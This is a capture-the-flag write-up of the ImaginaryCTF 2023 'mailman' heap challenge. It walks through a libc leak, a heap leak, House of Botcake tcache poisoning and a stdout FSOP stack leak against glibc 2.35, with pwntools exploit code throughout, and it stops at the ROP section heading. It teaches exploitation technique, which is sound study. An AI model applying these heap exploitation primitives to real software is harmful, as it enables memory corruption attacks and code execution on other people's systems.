---
title: ImaginaryCTF 2023 – mailman
date: '2023-07-24'
draft: false
authors: ['surg']
tags:
  ['Imaginary CTF 2023', 'Assembly', 'x86_64', 'Reverse Engineering', 'Binary Exploitation', 'Pwn']
summary: 'Because *every* protection had to be on.'
canonical: 'https://surg.dev/ictf23/'
---

# mailman (423pts, 31 solves)

> I’m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...
>
> Flag is in `./flag.txt`.
>
> Attachments: https://imaginaryctf.org/r/PIxtO#vuln https://imaginaryctf.org/r/c9Mk8#libc.so.6

imaginaryCTF ran this past weekend. I competed with [Project Sekai](https://sekai.team/), where we placed third. I helped solve `ret2lose`, `mailman`, `lcode`, and `vmdungeon`. I wanted to mainly focus on `mailman` as that challenge I worked on the most and ended up with the full exploit chain.

I’m also going to go through this entire exploit with a detailed explanation, as I find heap pwn to be constantly confusing, and there’s more and more techniques being used and employed in CTFs, so I hope that this explains why I used the tools and methods I did.

## Table of Contents

1. [My mailman has secrets](#secrets)
2. [Leaky Program](#leaky)
3. [One More Leak, now with cakes!](#botcake)
4. [ROP? I Like FSOP.](#fsop)
5. [FSOP? I Like ROP.](#rop)
6. [TLDR](#tldr)
7. [Full Script (Annotated)](#script)

## My mailman has secrets <a name="secrets"></a>

Mailman was a standard heapnote type challenge (I’ve seen it referred to as `CRUD`: `Create Read Update DELETE`). Loading into the program, we’re given options to write, read, or send a letter:

```
Welcome to the post office.
Enter your choice below:
1. Write a letter
2. Send a letter
3. Read a letter
>
```

Picking 1 allows us to specify an index, letter size (in bytes), and then send data, terminating on a new line. Picking 2 lets us pick an index, but seemingly does nothing, and picking 3 outputs the text of the letter that we select.

We aren’t given source, so we have to look at it in a disassembler. The first thing Binary Ninja shows us in the `main` function is `seccomp`:

```c
00001365      seccomp_rule_add(rax_2, 0x7fff0000, 2, 0)
00001385      seccomp_rule_add(rax_2, 0x7fff0000, 0, 0)
000013a5      seccomp_rule_add(rax_2, 0x7fff0000, 1, 0)
000013c5      seccomp_rule_add(rax_2, 0x7fff0000, 5, 0)
000013e5      seccomp_rule_add(rax_2, 0x7fff0000, 0x3c, 0)
000013f1      seccomp_load(rax_2)
```

seccomp is a way to make a type of "jail" for linux programs. It restricts execution to a limited set of syscalls, and kills the program if it attempts to call banned ones. While one could probably parse out that this is setting up an allowlist of syscalls `0`, `1`, `2`, `5`, and `0x3c`, I don’t know seccomp by heart. Luckily, `seccomp-tools` can tell us exactly what is going on here:

```bash
srg@pop-os:~/CTF/ictf23/mailman$ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

As expected, this only allows 64-bit syscalls `(A < 0x4000000)`, and of those, only permits `read, write, open, fstat, exit`. This means that when we do get some form of code execution, we have to open, read, and print the flag, rather than popping a shell with `execve`. Let’s look at the rest of the menu:

```c
00001478      while (true)
00001478          printf(format: "> ")
00001493          int32_t var_2c
00001493          __isoc99_scanf(format: "%d%*c", &var_2c)
00001498          int32_t rax_16 = var_2c
0000149e          if (rax_16 == 3)
000015bc              puts(str: mem[inidx()])
000014a7          else
000014a7              if (rax_16 s> 3)
000014a7                  break
000014b0              if (rax_16 == 1)
000014c5                  int64_t rax_18 = inidx()
000014dd                  printf(format: "letter size: ")
000014f8                  uint64_t bytes
000014f8                  __isoc99_scanf(format: "%lu%*c", &bytes)
0000151f                  mem[rax_18] = malloc(bytes)
00001532                  printf(format: "content: ")
0000155e                  fgets(buf: mem[rax_18], n: bytes.d, fp: stdin)
000014b5              else
000014b5                  if (rax_16 != 2)
000014b5                      break
0000158d                  free(mem: mem[inidx()])
000015cd      puts(str: "Invalid choice!")
000015d7      _exit(status: 0)
000015d7      noreturn
```

`inidx()` is the function that grabs our index value from `stdin`. There’s no bug in it, and it crashes the program if we specify an index higher than 15. After setting `mem` to be an array of `char*`, we see that the menu does mostly what we expected, except sending a letter is `free()`-ing that index. It can be pretty easily seen that we have two major bugs here:

- A read after free
- Double free

Sending a letter does not null the entry in `mem`, and there’s no check on the pointers in `mem` when we read from them. The only thing preventing this from being trivial is an update function that would allow use after free.

Alright, let’s see what we have to work with in terms of other security features. A quick checksec shows:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Ah... full protections. That certainly restricts us a lot. Full RELRO means that the Global Offset Table is read only. This prevents us from modifying how the program resolves `libc` functions when called. Speaking of libc, let’s check the version:

```bash
srg@pop-os:~/CTF/ictf23/mailman$ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
```

_Ha!_ This is starting to become a very annoying challenge. Not that we could’ve had much luck anyway, `seccomp` prevents us from using one gadgets of any form, due to the lack of `execve`, but glibc 2.35 also removes two symbols `__free_hook` and `__malloc_hook` which were user defined function pointers that were called before calling `free()` and `malloc()`. Not to mention that because of `seccomp`, we can’t call `mmap` or `mprotect` to write our own code. glibc 2.35 also has a few annoying protections in that we’ll detail later.

Finally, I need to setup our pwning environment. I use a tool called [pwninit](https://github.com/io12/pwninit), but there are similar tools out there.

```py
from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
```

## Leaky Program <a name="leaky"></a>

Ok, enough enumerating, we need to start by getting some leaks. We have no limitations to what size letter we can make (other than one larger 65536, due to `M_MMAP_MAX`), so we can easily leak an address to libc.

One of the main structures about how `malloc` manages its free lists, is that large chunks, when freed, go to a list called the `unsorted_bin`. While they are in these bins, they store pointers to the previous and next blocks of _free_ memory. However, when there is only one block, these pointers point to the `main_arena`, or the structure that manages all the bins for `malloc`. `main_arena` is located in libc, and not the heap. These pointers are placed at the start of the data segment of the chunk, meaning that read after free bug that we have can leak out the libc pointer! If the reason for why a chunk has libc pointers, I’d highly look at the official post about malloc internals on the [sourceware page](https://sourceware.org/glibc/wiki/MallocInternals).

So, to leak libc we need to alloc 2 large chunks, free the first one, then read from that freed chunk. The reason we need to alloc the 2nd chunk is because malloc will try to combine adjacent blocks of free memory to be efficient, and if we leave a free block next to the top chunk (the remaining space of the heap), malloc will just coalesce it on `free()`.

Because interacting with the menu can be verbose in exploit development, I also wrote some functions in pwntools to abstract away making, reading, and freeing chunks:

```py
r = conn() # either remote or process

def alloc(idx, size, data):
    print("ALLOCATING: ", idx)
    r.sendlineafter("> ", "1")
    r.sendlineafter("idx: ", str(idx))
    r.sendlineafter("size: ", str(size))
    r.sendlineafter("content: ", data)

def free(idx):
    print("FREEING: ", idx)
    r.sendlineafter("> ", "2")
    r.sendlineafter("idx: ", str(idx))

def show(idx):
    print("SHOWING: ", idx)
    r.sendlineafter("> ", "3")
    r.sendlineafter("idx: ", str(idx))
    return r.recvline()
```

Now, leaking libc, we just follow the steps above. To make sure these chunks don’t end up in smaller bins, we have to make them large, so 1350 bytes was chosen arbitrarily. We’ll have to interact with the smaller bins soon, but just for now, for this leak to work in this way, large-ish chunks are sufficient:

```py
# Make two large chunks
alloc(0, 1350, 'A')
alloc(1, 1350, 'A')
# Free the first one so bk = main_arena in libc
free(0)
resp = show(0)
# parse the libc address in little-endian
libcaddr = int(resp[5::-1].hex(),16)
# Use offsets found in gdb to compute libc base
libc.address = libcaddr - (0x7f7c10419ce0 - 0x7f7c10200000)
free(1)
```

Alright, with the libc leak we can now refer to many gadgets and functions with ease. But we still need more. It’s a safe bet to also grab a heap leak, but due to safe linking, the pointers are obfuscated:

```cpp
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

When a block is freed and ends up in one of the faster lists of malloc, it mangles them with the _position_ that it is stored in.

There’s a couple ways to get a leak, but I followed [this writeup](https://ctftime.org/writeup/34804) from AeroCTF. If both allocations are in the same page (4096 bytes), then the first 12 bits of `pos` are 0, since the position is shifted by 12. We can deobfuscate a heap ptr independently using the following function:

```py
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
```

This will just give us a heap base address from any leak. There was probably an [easier method](https://ret2school.github.io/post/catastrophe/), but I’m learning as I go.

With that, I was doing some testing so there are unnecessary allocs and frees here (but I’m too afraid to change the script due to offsets)

```py
#Grab some blocks
alloc(0,128,'A')
alloc(1,128,'A')
alloc(2,128,'A') #excess
alloc(3,128,'A') #excess
# Place them into the tcache
free(0)
free(1)
free(2)
show(0)
show(1)
#This printed out a heap address
addr = show(2)
free(3)
#Parse, deobfuscate, and set heap base.
addr = int(addr[5::-1].hex(),16)
heap_leak = deobfuscate(addr)
# seccomp actually alloc'd over a page of memory,
# so base was -0x1000 from what I got.
heap = (heap_leak >> 12 << 12) - 0x1000
```

From here, we need to talk about what we actually have been interacting with. The tcache is an array of linked lists which store freed chunks on a per-thread basis. The linked lists are indexed in order, and correspond to chunks of size 16-1032 bytes, increments of 16 bytes. This is a speedup in practice, as there is necessary thread safety operations when trying to alloc in general, since heap is shared among threads, where as this is a custom cache for each thread of your program. The big thing comes from the fact that they are terribly exploitable.

However, seccomp alloc'd and freed a lot of memory prior, so when debugging with pwndbg, I can check the bins with `bins` or their specific names `tcachebins`, `fastbins`, etc. And I noticed that there was a lot of mess before I wanted to start actual exploit development:

```c
tcachebins
0x20 [  7]: 0x560865ea1fd0 —▸ 0x560865ea2280 —▸ 0x560865ea1750 —▸ 0x560865ea1e30 —▸ 0x560865ea1c90 —▸ 0x560865ea1af0 —▸
 0x560865ea16c0 ◂— 0x0
0x70 [  7]: 0x560865ea1990 —▸ 0x560865ea1b30 —▸ 0x560865ea1cd0 —▸ 0x560865ea1e70 —▸ 0x560865ea2010 —▸ 0x560865ea2190 —▸
 0x560865ea16e0 ◂— 0x0
0x80 [  7]: 0x560865ea18f0 —▸ 0x560865ea1a70 —▸ 0x560865ea1c10 —▸ 0x560865ea1db0 —▸ 0x560865ea1f50 —▸ 0x560865ea2200 —▸
 0x560865ea1640 ◂— 0x0
0x90 [  4]: 0x560865ea1530 —▸ 0x560865ea14a0 —▸ 0x560865ea1800 —▸ 0x560865ea1770 ◂— 0x0
0xd0 [  5]: 0x560865ea1170 —▸ 0x560865ea0e40 —▸ 0x560865ea0b10 —▸ 0x560865ea07e0 —▸ 0x560865ea0350 ◂— 0x0
0xf0 [  2]: 0x560865ea2080 —▸ 0x560865ea1370 ◂— 0x0
fastbins
...
unsortedbin
all: 0x560865ea15b0 —▸ 0x7f8ff5a19ce0 (main_arena+96) ◂— 0x560865ea15b0
smallbins
0x20: 0x560865ea2160 —▸ 0x560865ea1fe0 —▸ 0x560865ea1e40 —▸ 0x560865ea1ca0 —▸ 0x560865ea1b00 ◂— ...
0x60: 0x560865ea1880 —▸ 0x7f8ff5a19d30 (main_arena+176) ◂— 0x560865ea1880
0x70: 0x560865ea19f0 —▸ 0x560865ea1b90 —▸ 0x560865ea1d30 —▸ 0x560865ea1ed0 —▸ 0x7f8ff5a19d40 (main_arena+192) ◂— ...
```

To remedy this, I just made a bunch of allocs (and leaked memory), until all of the bins were empty (yes, 16 is there twice, dont worry about it):

```py
print("Cleaning tcaches + smallbins")
for i in range(7):
    alloc(15, 16, 'A')
for i in range(7):
    alloc(15, 0x60, 'A')
for i in range(7):
    alloc(15, 0x70, 'A')
for i in range(4):
    alloc(15, 0x80, 'A')
for i in range(5):
    alloc(15, 0xc0, 'A')
for i in range(2):
    alloc(15, 0xe0, 'A')
for i in range(11):
    alloc(15, 0x20, 'A')
for i in range(7):
    alloc(15, 0x10, 'A')
alloc(15, 0x30, 'A')
```

I kept adding allocs until gdb said the bins were empty. _Now_, we can start doing some exploit chain... right?

## One More Leak, now with cakes! <a name="botcake"></a>

If other protections didn’t exist, I would be pretty set. But there’s a couple things in place that prevent me from trying simpler exploits.

- Full RELRO is enabled, so I cannot overwrite `GOT` to make libc funcs do something else...
- glibc 2.35 removed `__free_hook` and `__malloc_hook`, _and_ I don’t have a one gadget available due to seccomp...
- Even writing to `__exit_funcs` isn’t an option. This is different alternative to the `hooks`, as this is a function table of exit handlers when `exit()` is called through libc. But this specific program uses `_exit()` which does _not_ call any exit handlers... _and_ again, seccomp.

Unfortunately, this means I need one more leak: The stack. I need to be able to write to the return address of the stack frame to hijack control of the problem. The usual route is a symbol in libc called `environ`, which stores the address to a position on the stack where the `envp` array is held. Astute readers will notice the problem with just doing this alone, but lets continue with this route anyway:

We need to get a chunk to exist in libc, rather than the heap. This is the primary goal of most heap pwn, as depending on the program gives you "read what where" or "write what where" primitives anywhere in program memory. There is an excellent repository called [how2heap](https://github.com/shellphish/how2heap/tree/master) which contains tons of POCs for various heap exploits for many versions of glibc. The primative that I’ll be using, which achieves what I need is called [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c).

House of Botcake uses a double free bug to confuse malloc and allow use to return a chunk from an arbitrary location. `free()` can’t search through the entire heap each time to check whether a chunk is actually free, nor can it always trust the in-use bit, as not every structure on the heap (notably, tcaches) update and respond to the in-use bit. There are some basic detections (like making sure free isn’t called twice in a row on the same block), but it’s easily defeated by just freeing another block in between.

House of Botcake abuses this double free to make a chunk that is part of a consolidated chunk _and_ in the tcache at the same time. I followed [this writeup](https://ret2school.github.io/post/catastrophe/) for both botcake usage and a later exploit we need to do:

- First, we allocate 7 0x200 sized blocks, this will fill the tcache for 0x200 and makes any other frees end up in a different bin.
- Then, we allocate a previous chunk, and our victim chunk, each of size 0x200.
- We’ll allocate a 16 byte chunk to prevent any further consolidation past our victim chunk
- We free those 7 original chunks to actually fill the tcache.
- We free our victim chunk, it ends up in the unsorted bin, since its too large for any other bin.
- We free our previous chunk, because malloc now sees two large, adjacent chunks, it consoldates them and places a 0x421 size block into the unsorted bin. (malloc automatically allocs 16 bytes more than what we ask, and uses the last byte as a flag, so this is the result of 2 0x210 chunks)
- We free our victim chunk _again_. This bypasses the naive double free exception, and since our victim chunk has the info for a 0x210 byte block, it gets placed into the tcache (uh oh).
- Now, we alloc a 0x230 sized chunk. Why? Because malloc will split the unsorted block into two, giving us the 0x230 block... but this contains the metadata of our victim chunk, which we now have write control over _during_ our allocation.
- When we now alloc a 0x200 block, we’ll get the victim chunk, but then the next address that the tcache is pointed to is any address of our choosing!

The exact payload we provide our `0x230` chunk is explained below, and the complete code for this is as follows:

```py
# Get our environment target!
environ = libc.symbols['environ']

# Allocate 7 blocks of size 0x200, we’ll free them later
# We can’t leak them as before, so place them into our mem array properly
for i in range (7):
    alloc(9+i, 0x200, 'A')
# Allocate our prev block and our victim block, along with the buffer
alloc(6, 0x200, 'prev')
alloc(7, 0x200, 'victim')
alloc(8, 0x10, 'hello!')
# Fill the tcache!
for i in range(7):
    free(9+i)
# free our victim chunk
free(7)
# free our previous chunk (they are now consolidated)
free(6)
alloc(5, 0x200, 'X') # Open up a slot in the tcache
# double free vulnerablity, now victim is in the tcache!
free(7)

# We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk
# We’re going to write to it the necessary padding then:
# 0x211, to preserve the size of the victim chunk
# environ ^ ((heap + 0x3320) >> 12), because we need to pass a safe-linked ptr.
# Otherwise, malloc will crash. 0x3320 offset was found via debugging.
alloc(1, 0x230, b'T'*0x208 + p64(0x211) + p64((environ ^ ((heap + 0x3320) >> 12))))
alloc(2, 0x200, 'X') # remove a from the tcache again, updating the linked list structure

alloc(3, 0x200, '') # this guy is now located at environ!
show(3)
```

Ah, but we run into a slight issue. I _have_ to send a payload, and sending a newline clobbers the address stored by `environ`. So I need write somewhere that would somehow leak environ for me! There is a method to do this: File Structure Oriented Programming.

## ROP? I Like FSOP. <a name="fsop"></a>

I’m going to be honest, when I did this challenge during the CTF, I just saw the line of code that would work for me in the [ret2school](https://ret2school.github.io/post/catastrophe/) writeup and copied it. However, I feel that it would be wrong for me to not even try to explain this technique.

If you have ever used pure `open, read, write` syscalls, you’ll be quite familiar interacting with _file descriptors_. These are just integer indexes that correspond to a file currently accessible by your program. Traditionally, 0,1,2 are reserved for the linux "files" stdin, stdout, and stderr, which is how you interact with you program. Now, using `OWR` syscalls can be tedious to use, and libc has provided more feature-rich versions, such as `fopen, fprintf, fputc`, etc. These don’t use just file descriptors though, instead using a `FILE` struct, referenced by pointer. Let’s look at the relevant definition, using [exlir.bootlin.com](https://elixir.bootlin.com/), truncated slightly:

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it’s too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don’t get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

This struct has several fields, several managing _buffering_. That function, that every CTF challenge (including this one), `setbuf`, is a function that updates fields in this struct. Buffering is a great speedup, since calling syscalls every time you want to write a character to the screen, sequentially, is _slow_. It’s much faster to just write to a buffer for a bit, and eventually flush that buffer to the file descriptor. It might be feasible to hijack what these buffers are doing, and get a "read what where" primative out of it!

Let’s view each fields and disect them:

```c
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */
```

These fields are somewhat self explanitory: an IO FILE struct maintains pointers to buffers that hold read and write information, specifically denotating where a "cursor" is in each buffer, and where those buffers end. The buffering structure can somewhat be visualized like below. However, often these structures can overlap depending on what is happening with the file descriptor.

```
[a a a a a a a _ _ _ _ _ _ _ b b b b b b b c _ _ _ _ _ _ _ ]
 ^             ^           ^ ^                 ^         ^
 read_base     read_ptr    read_end
                             write_base        write_ptr write_end
 buf_base                                                buf_end
```

We have fields `int _flags`, `int _fileno`, `__off64_t _offset`, `FILE* _chain`, `char _vtable_offset`:

- `flags` is all of the flags that this file descriptor uses, its meant to only be 32 bits, and the top 2 bytes are set to `_IO_MAGIC` or `0xFBAD0000`.
- `fileno` is the actual, integer file descriptor for this `FILE`.
- `offset` is the byte offset within the file (used for seeking and such).
- `chain` is a pointer to the next `FILE*`, as they are all managed in a singly-linked list.
- `vtable_offset` is the offset selector of which vtable we should use for this file pointer. A vtable is a struct containing function ptrs, so that it’s easy to share functions between different structs.

So what exactly do we have to do? For starters, if you’ve used `fgets()` or other functions, then the `FILE*` for `stdout` is already defined and called `stdout` when you use it in your code (compared to `STDOUT_FILENO` referring to the file descriptor). libc stores a reference to the `FILE stdout` in a symbol: `_IO_2_1_stdout_`. Which means, using the arbitrary write primative we built earlier with botcake, we can instead write to the file struct for stdout. But what do we write? We can easily set the flags and buffers to whatever we need, but how does give us an aribtrary read?

Well, with buffering, eventually `stdout` has to flush the buffer and whatever is in it to the terminal. If we can set up the flags and the buffers in such a way that both prints out `environ`, without breaking `stdout`, we have a working arbitrary read primative. I’m heavily following [ret2school](https://ret2school.github.io/post/catastrophe/) at this point, adding my own explainations when necessary.

For core functions like `putc`, there are cases where it will instead flush the buffer and print something else. One of the macros in the `FILE.h` struct definition is the following:

```c
#define __putc_unlocked_body(_ch, _fp)					\
  (__glibc_unlikely ((_fp)->_IO_write_ptr >= (_fp)->_IO_write_end)	\
   ? __overflow (_fp, (unsigned char) (_ch))				\
   : (unsigned char) (*(_fp)->_IO_write_ptr++ = (_ch)))
```

This macro is called by `fputc` and `putchar` (the latter, used with stdout). This checks to see if the file pointer’s write ptr is at or past the end of the write buffer. If so, then we call this `__overflow` function, otherwise, we write the character to the current position of the write ptr and increment (Recall that postfix `++` returns the value before incrementing, I love C).

Alright, `__overflow` will likely flush the buffer, so our first condition is to make the `write_ptr` equal the `write_end`. Let’s take a look at `__overflow` to see what else we need to consider:

```c
int
__overflow (FILE *f, int ch)
{
  /* This is a single-byte stream.  */
  if (f->_mode == 0)
    _IO_fwide (f, -1);
  return _IO_OVERFLOW (f, ch);
}
```

We can assume `_mode` for stdout is assumed to be non-zero (since it’s not a single byte stream) This means we should look at `_IO_OVERFLOW`:

```c
//libio/libioP.h#L146
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
// Ok so let’s look at JUMP1: FUNC=__overflow, THIS=stdout, X1=our character
//libio/libioP.h#L124
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
// Oh jeez: Ok so this grabs the corresponding vtable IO_jump_t, based off of the offset, and the previous macro dereferences the correct function...
//libio/libioP.h#L107
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
// And now we have the symbol we care about, _IO_file_overflow
//libio/fileops.c#L1426
const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  ...
}
```

Macro chasing in glibc is usually a nightmare. Let’s look at `_IO_file_overflow` now:

```c
//libio/fileops.c#L730
int
_IO_new_file_overflow (FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
	{
	  _IO_doallocbuf (f);
	  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	}
      /* Otherwise must be currently reading.
	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
	 logically slide the buffer forwards one block (by setting the
	 read pointers to all point at the beginning of the block).  This
	 makes room for subsequent output.
	 Otherwise, set the read pointers to _IO_read_end (leaving that
	 alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
	{
	  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
	  _IO_free_backup_area (f);
	  f->_IO_read_base -= MIN (nbackup,
				   f->_IO_read_base - f->_IO_buf_base);
	  f->_IO_read_ptr = f->_IO_read_base;
	}

      if (f->_IO_read_ptr == f->_IO_buf_end)
	f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_IO_write_end = f->_IO_write_ptr;
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
```

Ok! We have some interesting things to manipulate here. The most important thing is we want to reach an `_IO_do_write` call. This will actually write whats in our buffer to the file descriptor. We obviously can’t let `ch` be `EOF`, but our program does print newlines all the time! So how do we reach the second call of `_IO_do_write`?

- `_IO_NO_WRITES` should be false, this prevents the error
- `_IO_CURRENTLY_PUTTING` should be true, this skips over unneeded write buffering
- `_IO_write_ptr == _IO_write_end`, which will call `_IO_do_flush`

Alright, before we can confirm that we hit the newline `_IO_do_write`, we need to look at `_IO_do_flush`:

```c
#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
```

Our mode is negative (you can confirm in gdb via `p *stdout`), so it’ll call `_IO_do_write`. This is a macro for `new_do_write`, which is great! The flush macro is all we needed to get to, rather than worrying about newlines. Now, let’s inspect this write code to see what else we need to set up:

```c
static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

Alright, the call we need to get to is `_IO_SYSWRITE`. This will finally write whatever we set our buffer. _But,_ we should avoid `IO_SYSSEEK`, since seeking on stdout is undefined. The simplest way is just to add `_IO_IS_APPENDING` to our flags, which bypasses it completely (The other method is to make `read_end==write_base`, which can be easily setup if necessary).

Finally, we need to make sure that we don’t break `stdout` in the future, since we plan to move it’s read and write buffers onto the stack, instead of libc. After it writes, it sets the `write_base` and `write_ptr` to `_buf_base`, and it sets `write_end` to either `_buf_base` or `_buf_end`, depending on the `_IO_LINE_BUF` or `_IO_UNBUFFERED` flag.

So, we’re ready to write to the `stdout` file pointer:

- Set `stdout->flags = _IO_MAGIC | (~_IO_NO_WRITES) | IO_IS_CURRENTLY_PUTTING | _IO_IS_APPENDING`
- Set `stdout->_IO_write_base` to `&environ`, to make that our buffer.
- Set `stdout->_IO_write_ptr = stdout->_IO_write_end = _IO_buf_end` to be `&environ+8`, to make our buffer non zero and just print out the stack leak.

The full payload is assembled:

```py
p64(0xfbad1800) + #flags
p64(environ)*3 + #read_ptrs, dont matter
p64(environ) +  #write_base
p64(environ + 0x8)*2 + #write_ptr and end
p64(environ + 8) + # buf_base
p64(environ + 8) # buf_end
```

Again, thanks to ret2school for detailing this. What were we doing? Right, stack leak

Now, we can get the stack:

```py
#symbols
environ = libc.symbols['environ']
stdout = libc.symbols['_IO_2_1_stdout_']
# prior botcake exploit, we make the next chunk return the location of stdout
alloc(1, 0x230, b'T'*0x208 + p64(0x211) + p64((stdout ^ ((heap + 0x3320) >> 12))))
alloc(2, 0x200, 'X')
# We write out stdout payload
alloc(3, 0x200, p64(0xfbad1800) + p64(environ)*3 +
(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8))
# When printf("> ") happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.
stack = u64(r.recv(8)[:-1].ljust(8, b'\x00'))
```

## FSOP? I Like ROP. <a name="rop"></a>

